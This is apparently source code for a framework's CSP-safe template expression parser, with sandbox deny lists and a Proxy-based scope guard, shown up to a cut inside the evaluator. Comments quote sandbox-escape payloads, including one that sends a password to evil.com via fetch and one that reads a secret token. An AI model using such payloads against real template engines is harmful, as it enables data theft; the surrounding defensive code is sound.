/**
 * Reflex CSP-Safe Expression Parser
 *
 * A recursive descent parser that evaluates expressions without using
 * `new Function()` or `eval()`, making it compliant with strict
 * Content Security Policy (CSP) environments.
 *
 * This module is NOT bundled with the core Reflex library to reduce
 * bundle size. Only load this if you need CSP-safe mode.
 *
 * @example
 * import { SafeExprParser } from 'reflex/csp';
 * const app = new Reflex().configure({
 *   cspSafe: true,
 *   parser: new SafeExprParser()
 * });
 */

import { META, createElementMembrane } from '../core/symbols.js';
import {
  isFlatScope,
  getFlatScopeValue,
  type FlatScope
} from '../core/scope-registry.js';

// Symbol for identifying ScopeContainer instances
const SCOPE_CONTAINER_MARKER = Symbol.for('reflex.ScopeContainer');

// Dangerous property names that must be blocked to prevent prototype pollution
// CRITICAL: __proto__ cannot be set via object literal syntax as it's treated as prototype setter
// We must use Object.defineProperty or direct assignment after creation
const DANGEROUS_PROPS: { [key: string]: boolean } = Object.create(null);
DANGEROUS_PROPS['__proto__'] = true;
DANGEROUS_PROPS['constructor'] = true;
DANGEROUS_PROPS['prototype'] = true;

/**
 * ScopeContainer - Secure scope storage that prevents prototype pollution
 *
 * SECURITY CRITICAL:
 * This class replaces Object.create() for scope inheritance to prevent
 * prototype chain attacks. All scope data is stored in a Map, isolating
 * it from the JavaScript prototype chain.
 *
 * The returned object is a Proxy that intercepts property access,
 * allowing it to work with JavaScript's `with` statement while still
 * providing security guarantees.
 *
 * BREAKING CHANGE: Regular objects are no longer allowed as scopes.
 * All code must use ScopeContainer instances.
 */
export interface ScopeContainerAPI {
  /** Check if a name exists in this scope or any parent scope */
  has(name: string): boolean;
  /** Get a value from this scope or any parent scope */
  get(name: string): any;
  /** Set a value in this scope (never writes to parent) */
  set(name: string, value: any): void;
  /** Delete a value from this scope */
  delete(name: string): boolean;
  /** Get all keys in this scope (not including parent) */
  keys(): IterableIterator<string>;
  /** Get the parent scope */
  getParent(): ScopeContainerAPI | null;
  /** Marker symbol access */
  readonly [key: symbol]: any;
}

// Type that combines the API with arbitrary property access
export type ScopeContainerInstance = ScopeContainerAPI & { [key: string]: any };

/**
 * ScopeContainer factory - creates a secure scope with Proxy-based property access
 *
 * The returned object is a Proxy that:
 * - Intercepts property gets/sets and delegates to internal Map
 * - Looks up parent scope for missing properties
 * - Blocks dangerous properties like __proto__, constructor, prototype
 * - Works with JavaScript's `with` statement for expression evaluation
 */
export class ScopeContainer {
  // Private constructor - use ScopeContainer.create() or new ScopeContainer()
  private _data: Map<string, any>;
  private _parent: ScopeContainerInstance | null;

  constructor(parent: ScopeContainerInstance | null = null) {
    this._data = new Map();
    this._parent = parent;

    // Return a Proxy that intercepts property access
    // This allows the scope to work with JavaScript's `with` statement
    return new Proxy(this, {
      get(target, prop, receiver) {
        // Symbol access (including our marker)
        if (typeof prop === 'symbol') {
          if (prop === SCOPE_CONTAINER_MARKER) return true;
          return undefined;
        }

        // Block dangerous properties
        if (DANGEROUS_PROPS[prop]) {
          return undefined;
        }

        // API methods
        if (prop === 'has') return target.has.bind(target);
        if (prop === 'get') return target.get.bind(target);
        if (prop === 'set') return target.set.bind(target);
        if (prop === 'delete') return target.delete.bind(target);
        if (prop === 'keys') return target.keys.bind(target);
        if (prop === 'getParent') return target.getParent.bind(target);

        // Property lookup - check own data first, then parent chain
        if (target._data.has(prop)) {
          return target._data.get(prop);
        }
        if (target._parent) {
          // Parent is also a Proxy, so direct property access works
          return (target._parent as any)[prop];
        }
        return undefined;
      },

      set(target, prop, value, receiver) {
        if (typeof prop === 'symbol') return false;

        // Block dangerous properties
        if (DANGEROUS_PROPS[prop]) {
          throw new Error(
            `Reflex Security: Cannot set dangerous property "${prop}" in scope.\n` +
            `This property is blocked to prevent prototype pollution.`
          );
        }

        target._data.set(prop, value);
        return true;
      },

      has(target, prop) {
        if (typeof prop === 'symbol') {
          return prop === SCOPE_CONTAINER_MARKER;
        }

        // Block dangerous properties
        if (DANGEROUS_PROPS[prop]) {
          return false;
        }

        if (target._data.has(prop)) return true;
        if (target._parent) return prop in target._parent;
        return false;
      },

      deleteProperty(target, prop) {
        if (typeof prop === 'symbol') return false;
        if (DANGEROUS_PROPS[prop]) return false;
        return target._data.delete(prop);
      },

      ownKeys(target) {
        return [...target._data.keys()];
      },

      getOwnPropertyDescriptor(target, prop) {
        if (typeof prop === 'symbol') return undefined;
        if (DANGEROUS_PROPS[prop]) return undefined;
        if (target._data.has(prop)) {
          return {
            value: target._data.get(prop),
            writable: true,
            enumerable: true,
            configurable: true
          };
        }
        return undefined;
      },

      // CRITICAL: Block __proto__ modification via setPrototypeOf
      // __proto__ assignment may bypass the set trap in some engines
      setPrototypeOf(target, proto) {
        throw new Error(
          'Reflex Security: Cannot change prototype of ScopeContainer.\n' +
          'This operation is blocked to prevent prototype pollution.'
        );
      },

      // Also need to define __proto__ as a non-writable property
      // to prevent some __proto__ bypass techniques
      defineProperty(target, prop, descriptor) {
        if (typeof prop === 'symbol') return false;
        if (DANGEROUS_PROPS[prop]) {
          throw new Error(
            `Reflex Security: Cannot define dangerous property "${prop}" in scope.\n` +
            `This property is blocked to prevent prototype pollution.`
          );
        }
        // For regular properties, just store in the Map
        if ('value' in descriptor) {
          target._data.set(prop, descriptor.value);
        }
        return true;
      }
    }) as any;
  }

  /**
   * Check if a name exists in this scope or any parent scope
   */
  has(name: string): boolean {
    if (this._data.has(name)) return true;
    if (this._parent) return this._parent.has(name);
    return false;
  }

  /**
   * Get a value from this scope or any parent scope
   */
  get(name: string): any {
    if (this._data.has(name)) return this._data.get(name);
    if (this._parent) return this._parent.get(name);
    return undefined;
  }

  /**
   * Set a value in this scope (never writes to parent)
   */
  set(name: string, value: any): void {
    // Block dangerous property names
    if (DANGEROUS_PROPS[name]) {
      throw new Error(
        `Reflex Security: Cannot set dangerous property "${name}" in scope.\n` +
        `This property is blocked to prevent prototype pollution.`
      );
    }
    this._data.set(name, value);
  }

  /**
   * Delete a value from this scope
   */
  delete(name: string): boolean {
    return this._data.delete(name);
  }

  /**
   * Get all keys in this scope (not including parent)
   */
  keys(): IterableIterator<string> {
    return this._data.keys();
  }

  /**
   * Get the parent scope
   */
  getParent(): ScopeContainerInstance | null {
    return this._parent;
  }

  /**
   * Static method to check if an object is a ScopeContainer
   */
  static isScopeContainer(obj: any): obj is ScopeContainerInstance {
    return obj !== null &&
           typeof obj === 'object' &&
           obj[SCOPE_CONTAINER_MARKER] === true;
  }

  /**
   * Create a ScopeContainer from a plain object (migration helper)
   * This allows one-time conversion of legacy objects.
   *
   * WARNING: This is for migration only. New code should create
   * ScopeContainer instances directly.
   */
  static fromObject(obj: Record<string, any>, parent: ScopeContainerInstance | null = null): ScopeContainerInstance {
    const container = new ScopeContainer(parent) as ScopeContainerInstance;
    for (const key of Object.keys(obj)) {
      // Skip dangerous keys during migration
      if (DANGEROUS_PROPS[key]) {
        console.warn(`Reflex Security: Skipping dangerous key "${key}" during scope migration`);
        continue;
      }
      container.set(key, obj[key]);
    }
    return container;
  }
}

// Safe globals accessible in expressions
// Note: Object is wrapped via SAFE_OBJECT to restrict dangerous methods
const SAFE_GLOBALS = {
  __proto__: null,
  Math, Date, Array, Number, String, Boolean, JSON,
  parseInt, parseFloat, isNaN, isFinite, NaN, Infinity,
  true: true, false: false, null: null, undefined: undefined
};

// Dangerous Object methods that could modify prototypes or global state
const UNSAFE_OBJECT_METHODS = Object.assign(Object.create(null), {
  defineProperty: 1,
  defineProperties: 1,
  create: 1,
  assign: 1,
  setPrototypeOf: 1,
  getOwnPropertyDescriptor: 1,
  getOwnPropertyDescriptors: 1,
  getOwnPropertyNames: 1,
  getOwnPropertySymbols: 1,
  getPrototypeOf: 1,
  preventExtensions: 1,
  seal: 1,
  freeze: 1,
  isExtensible: 1,
  isSealed: 1,
  isFrozen: 1
});

// Create a safe Object wrapper that only exposes safe methods
const SAFE_OBJECT = {
  keys: Object.keys,
  values: Object.values,
  entries: Object.entries,
  fromEntries: Object.fromEntries,
  hasOwn: Object.hasOwn || ((obj, prop) => Object.prototype.hasOwnProperty.call(obj, prop)),
  is: Object.is
};

// Add safe Object to SAFE_GLOBALS
SAFE_GLOBALS['Object'] = SAFE_OBJECT;

// CRITICAL SECURITY WARNING: Blacklist Approach Fragility
// This blacklist-based approach has inherent weaknesses:
// 1. New dangerous properties added to JavaScript (e.g., future TC39 proposals) won't be blocked
// 2. Browser extensions and polyfills can add non-standard dangerous accessors
// 3. Legacy browsers may have additional dangerous properties not listed here
//
// RECOMMENDATION: For maximum security, consider:
// - Implementing a whitelist of known-safe properties
// - Using a more restrictive CSP that blocks all dynamic code execution
// - Regularly auditing and updating this blacklist
// - Running templates in isolated contexts (Workers, sandboxed iframes)
//
// Dangerous property names that could lead to prototype pollution or app state leaks
const UNSAFE_PROPS = Object.assign(Object.create(null), {
  constructor: 1, prototype: 1, __defineGetter__: 1, __defineSetter__: 1,
  __lookupGetter__: 1, __lookupSetter__: 1,
  // CRITICAL SECURITY FIX: Block access to __rfx_app to prevent app state leak
  // Without this, templates can access the entire internal state via {{ $el.__rfx_app.s.secretToken }}
  __rfx_app: 1,
  // CRITICAL SECURITY FIX: Block DOM properties that provide access to window/document/fetch
  // These properties allow data exfiltration via network requests
  // Exploit: {{ $el.ownerDocument.defaultView.fetch('https://evil.com?data=' + password) }}
  ownerDocument: 1,
  defaultView: 1,
  contentWindow: 1,
  contentDocument: 1,
  // Block direct access to I/O APIs if exposed through objects
  fetch: 1,
  XMLHttpRequest: 1,
  WebSocket: 1,
  navigator: 1,
  location: 1,
  // Block access to global scope
  window: 1,
  document: 1,
  globalThis: 1,
  self: 1,
  top: 1,
  parent: 1,
  frames: 1,
  // CRITICAL FIX #9: Expanded blacklist for additional attack vectors
  // Add properties that might be added by polyfills or browser extensions
  eval: 1,
  Function: 1,
  Worker: 1,
  SharedWorker: 1,
  ServiceWorker: 1,
  importScripts: 1,
  postMessage: 1,
  // Reflect and Proxy can be used to bypass protections
  Reflect: 1,
  Proxy: 1
});
UNSAFE_PROPS['__proto__'] = 1;

/**
 * CRITICAL FIX #9: Runtime property safety validation
 * Check if a property name matches patterns known to be dangerous
 * This provides defense-in-depth against properties not in the blacklist
 *
 * CRITICAL FIX: Use exact matching instead of substring matching to avoid false positives
 * Substring matching blocks legitimate properties like "important", "evaluation", "prototype_id"
 * Now we only block exact matches to the dangerous property names
 */
function isDangerousPropertyPattern(prop: string): boolean {
  if (typeof prop !== 'string') return false;

  // Properties starting with __ are often internal/dangerous
  if (prop.startsWith('__')) return true;

  // CRITICAL FIX: Use exact word matching with word boundaries instead of substring includes
  // This prevents false positives while still catching dangerous patterns
  // Only block if the dangerous word appears as a complete word (with word boundaries)
  const dangerousWords = [
    'constructor', 'proto', 'eval', 'function',
    'import', 'require', 'process', 'global'
  ];

  const lowerProp = prop.toLowerCase();

  // Check for exact matches first (most common case)
  if (dangerousWords.includes(lowerProp)) return true;

  // CRITICAL FIX #4: Check for word boundaries to avoid false positives
  // Previous bug: Used [^a-z] which treated underscores as word boundaries
  // This caused false positives for legitimate properties like constructor_id, proto_config
  //
  // TASK 12.6: Enforce Unicode-aware identifiers
  // Use Unicode Property Escapes \p{ID_Continue} to properly identify identifier characters
  // This ensures international variable names (e.g., varÀ, 変数, μεταβλητή) are treated correctly
  //
  // Examples that SHOULD match (dangerous):
  //   - constructor (exact match)
  //   - _constructor (non-alphanumeric before)
  //   - constructor_ (non-alphanumeric after)
  //   - proto.chain (non-alphanumeric after)
  //
  // Examples that SHOULD NOT match (safe):
  //   - constructor_id (underscore is part of identifier)
  //   - proto_config (underscore is part of identifier)
  //   - important (dangerous word is substring)
  //   - evaluation (dangerous word is substring)
  //   - constructorÀ (À is part of identifier - Unicode continuation char)
  //   - constructorFoo (Foo continues the identifier)
  for (const dangerous of dangerousWords) {
    // TASK 12.6 + 13.7: Create a regex that matches the dangerous word with Unicode-aware word boundaries
    // Use [^\p{ID_Continue}$\u200c\u200d] to match non-identifier characters (Unicode-aware)
    // This ensures characters like À, 日, μ are treated as part of the identifier
    //
    // TASK 13.7: Explicitly include Zero-Width Joiners (ZWJ/ZWNJ) as identifier characters
    // U+200C (ZWNJ) and U+200D (ZWJ) are used in some scripts (Arabic, Indic) to control
    // character joining. They MUST be treated as part of the identifier, not as word boundaries.
    // Without this, an attacker could use "construc\u200Dtor" to bypass the "constructor" check.
    //
    // Match if: start of string OR non-identifier-char before, dangerous word, end of string OR non-identifier-char after
    const pattern = new RegExp(`(^|[^\\p{ID_Continue}$\\u200c\\u200d])${dangerous}([^\\p{ID_Continue}$\\u200c\\u200d]|$)`, 'iu');
    if (pattern.test(lowerProp)) return true;
  }

  return false;
}

// Dangerous method names that should be blocked on any object
const UNSAFE_METHODS = Object.assign(Object.create(null), {
  ...UNSAFE_OBJECT_METHODS,
  // Additional dangerous methods that could be used for sandbox escape
  eval: 1,
  Function: 1,
  // CRITICAL FIX #9: CSP Bypass via Method Borrowing
  // call/apply/bind allow changing the 'this' context, which can be used to
  // invoke methods on objects that were intended to be isolated
  // Example: safeObj.method.apply(unsafeObj, args) bypasses isolation
  call: 1,
  apply: 1,
  bind: 1,
  // CRITICAL FIX: Sandbox Escape via getRootNode()
  // getRootNode() provides access to the document root which can lead to window access
  // Example: $el.getRootNode() returns the document, which has defaultView (window)
  // This bypasses all sandbox restrictions and allows full DOM/window access
  getRootNode: 1,
  // CRITICAL SECURITY FIX: Expand denylist to prevent additional attack vectors
  // String.prototype methods that generate HTML (XSS vectors)
  link: 1,          // String.prototype.link() - generates <a> tag
  anchor: 1,        // String.prototype.anchor() - generates <a> with name attribute
  big: 1,           // String.prototype.big() - generates <big> tag
  blink: 1,         // String.prototype.blink() - generates <blink> tag
  bold: 1,          // String.prototype.bold() - generates <b> tag
  fixed: 1,         // String.prototype.fixed() - generates <tt> tag
  fontcolor: 1,     // String.prototype.fontcolor() - generates <font> tag
  fontsize: 1,      // String.prototype.fontsize() - generates <font> tag
  italics: 1,       // String.prototype.italics() - generates <i> tag
  small: 1,         // String.prototype.small() - generates <small> tag
  strike: 1,        // String.prototype.strike() - generates <strike> tag
  sub: 1,           // String.prototype.sub() - generates <sub> tag
  sup: 1,           // String.prototype.sup() - generates <sup> tag
  // Code execution methods
  setTimeout: 1,
  setInterval: 1,
  setImmediate: 1
  // NOTE: valueOf and toString are NOT blocked as they're needed for normal operations
  // The membrane system provides the primary defense against malicious overrides
});

/**
 * CSP-Safe Expression Parser
 *
 * Implements a recursive descent parser supporting:
 * - Literals: strings, numbers, booleans, null, undefined
 * - Identifiers with context/state lookup
 * - Property access: dot notation and bracket notation
 * - Function calls with arguments
 * - Binary operators: +, -, *, /, %, ==, ===, !=, !==, <, >, <=, >=, &&, ||, ??, in
 * - Unary operators: !, -, typeof
 * - Ternary operator: condition ? then : else
 * - Array literals: [a, b, c]
 * - Object literals: { key: value }
 * - Magic properties: $event, $el, $refs, $dispatch, $nextTick
 */
// CRITICAL SECURITY: Maximum recursion depth to prevent stack overflow DoS
// A malicious expression like ((((...(((1)))...))) with 10k nested parens
// will crash the parser without this limit
const MAX_RECURSION_DEPTH = 50;

export class SafeExprParser {
  declare pos: number;
  declare expr: string;
  declare depth: number;

  constructor() {
    this.pos = 0;
    this.expr = '';
    this.depth = 0;
  }

  /**
   * Compile an expression to an evaluator function.
   *
   * @param {string} exp - Expression string
   * @param {Reflex} reflex - Reflex instance (for _tk, _mf, _refs, etc.)
   * @returns {Function} Evaluator (state, context, $event, $el) => result
   */
  compile(exp, reflex) {
    const ast = this.parse(exp);
    return (state, context, $event, $el) => {
      try {
        return this._evaluate(ast, state, context, $event, $el, reflex);
      } catch (err) {
        // CRITICAL SECURITY: Rethrow security violations instead of swallowing them
        // Security errors must crash the app to prevent attacks
        if (err instanceof TypeError && err.message && err.message.includes('Reflex Security:')) {
          throw err;
        }
        console.warn('Reflex: Expression evaluation error:', exp, err);
        return undefined;
      }
    };
  }

  /**
   * Parse an expression into an AST.
   */
  parse(expr) {
    this.expr = expr.trim();
    this.pos = 0;
    this.depth = 0;
    return this.parseExpression();
  }

  parseExpression() {
    // CRITICAL SECURITY FIX: Prevent stack overflow DoS via deeply nested expressions
    // Without this check, {{ ((((...(((1)))...))) }} with 10k parens crashes the parser
    if (++this.depth > MAX_RECURSION_DEPTH) {
      throw new Error(
        `Reflex Security: Expression exceeds maximum nesting depth (${MAX_RECURSION_DEPTH}). ` +
        `This could be a denial-of-service attack. Simplify your expression.`
      );
    }
    try {
      return this.parseTernary();
    } finally {
      this.depth--;
    }
  }

  parseTernary() {
    const condition = this.parseOr();
    this.skipWhitespace();
    if (this.peek() === '?') {
      this.pos++;
      this.skipWhitespace();
      const consequent = this.parseExpression();
      this.skipWhitespace();
      if (this.peek() !== ':') throw new Error("Expected ':' in ternary");
      this.pos++;
      this.skipWhitespace();
      const alternate = this.parseExpression();
      return { type: 'ternary', condition, consequent, alternate };
    }
    return condition;
  }

  parseOr() {
    let left = this.parseAnd();
    while (this.matchStr('||')) {
      left = { type: 'binary', op: '||', left, right: this.parseAnd() };
    }
    return left;
  }

  parseAnd() {
    let left = this.parseNullishCoalescing();
    while (this.matchStr('&&')) {
      left = { type: 'binary', op: '&&', left, right: this.parseNullishCoalescing() };
    }
    return left;
  }

  parseNullishCoalescing() {
    let left = this.parseEquality();
    while (this.matchStr('??')) {
      left = { type: 'binary', op: '??', left, right: this.parseEquality() };
    }
    return left;
  }

  parseEquality() {
    let left = this.parseRelational();
    while (true) {
      this.skipWhitespace();
      if (this.matchStr('===')) left = { type: 'binary', op: '===', left, right: this.parseRelational() };
      else if (this.matchStr('!==')) left = { type: 'binary', op: '!==', left, right: this.parseRelational() };
      else if (this.matchStr('==')) left = { type: 'binary', op: '==', left, right: this.parseRelational() };
      else if (this.matchStr('!=')) left = { type: 'binary', op: '!=', left, right: this.parseRelational() };
      else break;
    }
    return left;
  }

  parseRelational() {
    let left = this.parseComparison();
    while (true) {
      this.skipWhitespace();
      // Check for 'in' operator (must be followed by whitespace or special char to avoid matching 'indexOf')
      if (this.matchStr('in ') || (this.matchStr('in') && (this.peek() === '(' || this.peek() === '[' || this.peek() === '{' || !this.isIdentPart(this.peek())))) {
        left = { type: 'binary', op: 'in', left, right: this.parseComparison() };
      } else break;
    }
    return left;
  }

  parseComparison() {
    let left = this.parseAdditive();
    while (true) {
      this.skipWhitespace();
      if (this.matchStr('<=')) left = { type: 'binary', op: '<=', left, right: this.parseAdditive() };
      else if (this.matchStr('>=')) left = { type: 'binary', op: '>=', left, right: this.parseAdditive() };
      else if (this.peek() === '<' && this.expr[this.pos + 1] !== '<') {
        this.pos++;
        left = { type: 'binary', op: '<', left, right: this.parseAdditive() };
      } else if (this.peek() === '>' && this.expr[this.pos + 1] !== '>') {
        this.pos++;
        left = { type: 'binary', op: '>', left, right: this.parseAdditive() };
      } else break;
    }
    return left;
  }

  parseAdditive() {
    let left = this.parseMultiplicative();
    while (true) {
      this.skipWhitespace();
      if (this.peek() === '+') {
        this.pos++;
        left = { type: 'binary', op: '+', left, right: this.parseMultiplicative() };
      } else if (this.peek() === '-') {
        this.pos++;
        left = { type: 'binary', op: '-', left, right: this.parseMultiplicative() };
      } else break;
    }
    return left;
  }

  parseMultiplicative() {
    let left = this.parseUnary();
    while (true) {
      this.skipWhitespace();
      if (this.peek() === '*') {
        this.pos++;
        left = { type: 'binary', op: '*', left, right: this.parseUnary() };
      } else if (this.peek() === '/') {
        this.pos++;
        left = { type: 'binary', op: '/', left, right: this.parseUnary() };
      } else if (this.peek() === '%') {
        this.pos++;
        left = { type: 'binary', op: '%', left, right: this.parseUnary() };
      } else break;
    }
    return left;
  }

  parseUnary() {
    this.skipWhitespace();
    if (this.peek() === '!') {
      this.pos++;
      return { type: 'unary', op: '!', arg: this.parseUnary() };
    }
    if (this.peek() === '-' && !this.isDigit(this.expr[this.pos + 1])) {
      this.pos++;
      return { type: 'unary', op: '-', arg: this.parseUnary() };
    }
    // CRITICAL FIX: Missing Unary Plus Operator
    // The unary plus (+value) is the standard, idiomatic way to coerce strings to numbers
    // in JavaScript templates. Without this, templates using +inputValue throw a syntax error
    // in Safe Mode, forcing developers to use verbose Number() calls.
    if (this.peek() === '+' && !this.isDigit(this.expr[this.pos + 1])) {
      this.pos++;
      return { type: 'unary', op: '+', arg: this.parseUnary() };
    }
    if (this.matchStr('typeof ')) {
      return { type: 'unary', op: 'typeof', arg: this.parseUnary() };
    }
    return this.parsePostfix();
  }

  parsePostfix() {
    let obj = this.parsePrimary();
    while (true) {
      this.skipWhitespace();
      if (this.peek() === '.') {
        this.pos++;
        this.skipWhitespace();
        const prop = this.parseIdentifier();
        if (!prop) throw new Error("Expected property name after '.'");
        obj = { type: 'member', object: obj, property: prop, computed: false };
      } else if (this.peek() === '[') {
        this.pos++;
        const prop = this.parseExpression();
        this.skipWhitespace();
        if (this.peek() !== ']') throw new Error("Expected ']'");
        this.pos++;
        obj = { type: 'member', object: obj, property: prop, computed: true };
      } else if (this.peek() === '(') {
        this.pos++;
        const args = this.parseArguments();
        obj = { type: 'call', callee: obj, arguments: args };
      } else {
        break;
      }
    }
    return obj;
  }

  parseArguments() {
    const args = [];
    this.skipWhitespace();
    if (this.peek() !== ')') {
      args.push(this.parseExpression());
      while (this.peek() === ',') {
        this.pos++;
        args.push(this.parseExpression());
      }
    }
    if (this.peek() !== ')') throw new Error("Expected ')'");
    this.pos++;
    return args;
  }

  parsePrimary() {
    this.skipWhitespace();
    const c = this.peek();

    // Parenthesized expression
    if (c === '(') {
      this.pos++;
      const expr = this.parseExpression();
      this.skipWhitespace();
      if (this.peek() !== ')') throw new Error("Expected ')'");
      this.pos++;
      return expr;
    }

    // Array literal
    if (c === '[') {
      this.pos++;
      const elements = [];
      this.skipWhitespace();
      if (this.peek() !== ']') {
        elements.push(this.parseExpression());
        while (this.peek() === ',') {
          this.pos++;
          this.skipWhitespace();
          if (this.peek() === ']') break; // trailing comma
          elements.push(this.parseExpression());
        }
      }
      if (this.peek() !== ']') throw new Error("Expected ']'");
      this.pos++;
      return { type: 'array', elements };
    }

    // Object literal
    if (c === '{') {
      this.pos++;
      const properties = [];
      this.skipWhitespace();
      if (this.peek() !== '}') {
        properties.push(this.parseObjectProperty());
        while (this.peek() === ',') {
          this.pos++;
          this.skipWhitespace();
          if (this.peek() === '}') break;
          properties.push(this.parseObjectProperty());
        }
      }
      if (this.peek() !== '}') throw new Error("Expected '}'");
      this.pos++;
      return { type: 'object', properties };
    }

    // String literal
    if (c === '"' || c === "'" || c === '`') {
      return this.parseString();
    }

    // Number literal
    if (this.isDigit(c) || (c === '-' && this.isDigit(this.expr[this.pos + 1]))) {
      return this.parseNumber();
    }

    // Identifier or keyword
    const id = this.parseIdentifier();
    if (id) {
      if (id === 'true') return { type: 'literal', value: true };
      if (id === 'false') return { type: 'literal', value: false };
      if (id === 'null') return { type: 'literal', value: null };
      if (id === 'undefined') return { type: 'literal', value: undefined };
      if (id === 'NaN') return { type: 'literal', value: NaN };
      if (id === 'Infinity') return { type: 'literal', value: Infinity };
      return { type: 'identifier', name: id };
    }

    throw new Error('Unexpected token: ' + c);
  }

  parseObjectProperty() {
    this.skipWhitespace();
    let key;
    if (this.peek() === '"' || this.peek() === "'") {
      key = this.parseString().value;
    } else if (this.peek() === '[') {
      this.pos++;
      key = this.parseExpression();
      this.skipWhitespace();
      if (this.peek() !== ']') throw new Error("Expected ']'");
      this.pos++;
      this.skipWhitespace();
      if (this.peek() !== ':') throw new Error("Expected ':'");
      this.pos++;
      const value = this.parseExpression();
      return { computed: true, key, value };
    } else {
      key = this.parseIdentifier();
    }
    this.skipWhitespace();
    if (this.peek() === ':') {
      this.pos++;
      const value = this.parseExpression();
      return { computed: false, key, value };
    }
    // Shorthand property
    return { computed: false, key, value: { type: 'identifier', name: key }, shorthand: true };
  }

  parseString() {
    const quote = this.peek();
    this.pos++;
    let value = '';
    while (this.pos < this.expr.length && this.peek() !== quote) {
      if (this.peek() === '\\') {
        this.pos++;
        const esc = this.peek();
        if (esc === 'n') value += '\n';
        else if (esc === 't') value += '\t';
        else if (esc === 'r') value += '\r';
        else if (esc === '\\') value += '\\';
        else if (esc === quote) value += quote;
        else value += esc;
        this.pos++;
      } else {
        value += this.peek();
        this.pos++;
      }
    }
    if (this.peek() !== quote) throw new Error('Unterminated string');
    this.pos++;
    return { type: 'literal', value };
  }

  parseNumber() {
    let num = '';
    if (this.peek() === '-') { num += '-'; this.pos++; }
    while (this.isDigit(this.peek())) { num += this.peek(); this.pos++; }
    if (this.peek() === '.') {
      num += '.'; this.pos++;
      while (this.isDigit(this.peek())) { num += this.peek(); this.pos++; }
    }
    if (this.peek() === 'e' || this.peek() === 'E') {
      num += this.peek(); this.pos++;
      if (this.peek() === '+' || this.peek() === '-') { num += this.peek(); this.pos++; }
      while (this.isDigit(this.peek())) { num += this.peek(); this.pos++; }
    }
    return { type: 'literal', value: parseFloat(num) };
  }

  parseIdentifier() {
    const start = this.pos;
    if (!this.isIdentStart(this.peek())) return null;
    while (this.isIdentPart(this.peek())) this.pos++;
    return this.expr.slice(start, this.pos);
  }

  skipWhitespace() {
    while (this.pos < this.expr.length && /\s/.test(this.peek())) this.pos++;
  }

  peek() { return this.expr[this.pos]; }

  matchStr(s) {
    this.skipWhitespace();
    if (this.expr.slice(this.pos, this.pos + s.length) === s) {
      this.pos += s.length;
      return true;
    }
    return false;
  }

  isDigit(c) { return c >= '0' && c <= '9'; }

  // CRITICAL FIX #8: Unicode Identifier Support
  //
  // PREVIOUS BUG: Strict ASCII-only regex /[a-zA-Z_$]/ rejected valid Unicode identifiers
  // This broke applications using internationalized variable names (common in non-English teams)
  // Example failures: accented characters (café), emojis (💡), non-Latin scripts (日本語)
  //
  // SOLUTION: Use Unicode property escapes to match ECMAScript identifier syntax
  // - \p{ID_Start} matches all characters valid at the start of an identifier
  // - \p{ID_Continue} matches all characters valid in the rest of an identifier
  // - Includes Latin, Greek, Cyrillic, CJK, Arabic, Hebrew, Devanagari, and more
  // - Also includes combining marks, digits, and connectors in ID_Continue
  //
  // PERFORMANCE NOTE: Unicode regex with 'u' flag is slightly slower than ASCII-only
  // However, correctness and i18n support are more important than micro-optimization
  isIdentStart(c) {
    if (!c) return false;
    // Fast path for common ASCII identifiers (optimization)
    if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || c === '_' || c === '$') {
      return true;
    }
    // Unicode path for international identifiers
    // Use \p{ID_Start} for ECMAScript-compliant identifier start characters
    return /[\p{ID_Start}$_]/u.test(c);
  }

  isIdentPart(c) {
    if (!c) return false;
    // Fast path for common ASCII identifiers (optimization)
    if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c === '_' || c === '$') {
      return true;
    }
    // Unicode path for international identifiers
    // Use \p{ID_Continue} for ECMAScript-compliant identifier continuation characters
    // Includes digits, combining marks (U+200C, U+200D), and all ID_Start characters
    return /[\p{ID_Continue}$\u200c\u200d]/u.test(c);
  }

  /**
   * Evaluate an AST node.
   */
  _evaluate(node, state, context, $event, $el, reflex) {
    if (!node) return undefined;

    switch (node.type) {
      case 'literal':
        return node.value;

      case 'identifier': {
        const name = node.name;
        // CRITICAL FIX #9: Enhanced property validation with pattern matching
        if (UNSAFE_PROPS[name] || isDangerousPropertyPattern(name)) {
          console.warn('Reflex: Blocked access to unsafe property:', name);
          return undefined;
        }
        // Magic properties
        if (name === '$event') return $event;
        // CRITICAL SECURITY FIX: Wrap $el in element membrane to prevent sandbox escape
        // Without this, {{ $el.ownerDocument.defaultView.fetch(...) }} enables data exfiltration
        if (name === '$el') return createElementMembrane($el);
        if (name === '$refs') return reflex._refs;
        if (name === '$dispatch') return reflex._dispatch.bind(reflex);
        if (name === '$nextTick') return reflex.nextTick.bind(reflex);

        // BREAKING CHANGE: Context must be FlatScope or ScopeContainer
        // FlatScope is the new preferred format (uses flat Map storage)
        // ScopeContainer is supported for backward compatibility
        if (context) {
          // Check for FlatScope first (new flat lookup)
          if (isFlatScope(context)) {
            const result = getFlatScopeValue(context, name);
            if (result.found) {
              const value = result.value;
              // Track dependency if reactive
              if (value !== null && typeof value === 'object') {
                const meta = value[META] || reflex._mf.get(value);
                if (meta) reflex.trackDependency(meta, name);
              }
              return value;
            }
            // Not found in flat scope - continue to state/global lookup
            // This is INTENTIONAL - no parent chain traversal
          } else if (ScopeContainer.isScopeContainer(context)) {
            // ScopeContainer path (backward compatibility)
            if (context.has(name)) {
              const value = context.get(name);
              // Track dependency if reactive
              if (value !== null && typeof value === 'object') {
                const meta = value[META] || reflex._mf.get(value);
                if (meta) reflex.trackDependency(meta, name);
              }
              return value;
            }
          } else if (typeof context === 'object' && Object.keys(context).length === 0) {
            // Allow empty plain objects as equivalent to no context
            // This provides backward compatibility for tests
            // Fall through to state/global lookup
          } else {
            // Neither FlatScope nor ScopeContainer - reject
            throw new TypeError(
              `Reflex Security: Context must be a FlatScope or ScopeContainer instance.\n` +
              `Received: ${typeof context} ${context?.constructor?.name || 'unknown'}\n\n` +
              `BREAKING CHANGE: Regular objects are no longer allowed as scopes.\n` +
              `Migration: Scopes are now created automatically by m-for.`
            );
          }
        }

        // State lookup
        if (state && name in state) {
          return state[name];
        }
        // Global lookup
        if (name in SAFE_GLOBALS) return SAFE_GLOBALS[name];
        return undefined;
      }

      case 'member': {
        const obj = this._evaluate(node.object, state, context, $event, $el, reflex);
        if (obj == null) return undefined;
        const prop = node.computed
          ? this._evaluate(node.property, state, context, $event, $el, reflex)
          : node.property;
        // CRITICAL FIX #9: Enhanced property validation with pattern matching
        if (UNSAFE_PROPS[prop] || isDangerousPropertyPattern(prop)) {
          console.warn('Reflex: Blocked access to unsafe property:', prop);
